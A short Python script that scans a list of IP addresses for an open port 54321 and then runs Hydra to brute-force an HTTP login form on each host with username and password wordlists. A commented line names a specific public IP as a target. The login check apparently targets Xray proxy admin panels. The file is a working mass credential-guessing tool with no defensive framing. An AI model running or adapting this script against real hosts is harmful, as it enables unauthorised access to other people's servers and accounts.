import os.path
import socket
import subprocess
def open_file():
    file = open('ips_with_open_ports.txt','r')
    lines = file.readlines()
    for line in lines:
        check_alive_ips(line)


def is_ips_port_open(ip):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(0.5)
        return s.connect_ex((ip,54321)) == 0

def check_alive_ips(ip):
    conn = is_ips_port_open(ip)
    if(conn):
        print ("Port is open for :))))))))))",ip)
        with open("ips_tested","a") as inp:
            ip=str(ip)
            inp.write(ip)
            inp.write(':54321')
            inp.write('\n')
    else:
        print ("Port is not open for ",ip)
        print("======================================")


def brute_force(ip):

                        #subprocess.call(["hydra","-o cracked.txt","-V","-f","-l","ignite","-P","passwords.txt",ip])
                        #subprocess.call(["hydra","-I","-o cracked.txt","-f","-L","usernames.txt","-P","passwords.txt",ip])
        subprocess.call(["hydra","-I","-o found.txt","-vV","-f","-L","usernames.txt","-P","passwords.txt","-s 54321",ip,"http-post-form","/:username=^USER^&password=^PASS^:&S=CPU"])
                        #hydra -o found.txt -L usernames.txt -P passwords.txt -s 54321 65.21.178.4 http-post-form "/:username=^USER^&password=^PASS^:S=xray" -vV -f

#gets ips one by one to brute_force()
def brute_force_check():
    print("Brutefoce time :D")
    ips = open('ips_with_open_ports.txt',"r") 
    for ip in ips:
        ip = ip.rstrip()
        brute_force(ip)

brute_force_check()

#open_file()
